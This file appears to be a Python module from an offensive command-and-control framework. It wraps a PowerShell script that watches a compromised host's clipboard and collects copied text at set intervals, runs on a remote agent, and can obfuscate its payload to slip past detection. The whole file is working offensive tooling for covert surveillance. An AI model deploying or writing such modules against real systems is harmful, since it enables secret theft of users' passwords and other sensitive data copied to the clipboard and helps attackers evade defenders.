from lib.common import helpers

class Module:

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'Get-ClipboardContents',

            'Author': ['@harmj0y'],

            'Description': ('Monitors the clipboard on a specified interval for changes to copied text.'),

            'Background' : True,

            'OutputExtension' : None,

            'NeedsAdmin' : False,

            'OpsecSafe' : True,

            'Language' : 'powershell',

            'MinLanguageVersion' : '2',

            'Comments': [
                'http://brianreiter.org/2010/09/03/copy-and-paste-with-clipboard-from-powershell/'
            ]
        }

        # any options needed by the module, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Agent' : {
                'Description'   :   'Agent to run module on.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'CollectionLimit' : {
                'Description'   :   "Specifies the interval in minutes to capture clipboard text. Defaults to indefinite collection.",
                'Required'      :   False,
                'Value'         :   ''
            },
            'PollInterval' : {
                'Description'   :   "Interval (in seconds) to check the clipboard for changes, defaults to 15 seconds.",
                'Required'      :   True,
                'Value'         :   '15'
            }
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        for param in params:
            # parameter format is [Name, Value]
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value


    def generate(self, obfuscate=False, obfuscationCommand=""):

        # read in the common module source code
        moduleSource = self.mainMenu.installPath + "/data/module_source/collection/Get-ClipboardContents.ps1"
        if obfuscate:
            helpers.obfuscate_module(moduleSource=moduleSource, obfuscationCommand=obfuscationCommand)
            moduleSource = moduleSource.replace("module_source", "obfuscated_module_source")
        try:
            f = open(moduleSource, 'r')
        except:
            print helpers.color("[!] Could not read module source path at: " + str(moduleSource))
            return ""

        moduleCode = f.read()
        f.close()

        script = moduleCode

        scriptEnd = "Get-ClipboardContents"

        for option, values in self.options.iteritems():
            if option.lower() != "agent":
                if values['Value'] and values['Value'] != '':
                    if values['Value'].lower() == "true":
                        # if we're just adding a switch
                        scriptEnd += " -" + str(option)
                    else:
                        scriptEnd += " -" + str(option) + " " + str(values['Value'])
        if obfuscate:
            scriptEnd = helpers.obfuscate(self.mainMenu.installPath, psScript=scriptEnd, obfuscationCommand=obfuscationCommand)
        script += scriptEnd
        return script
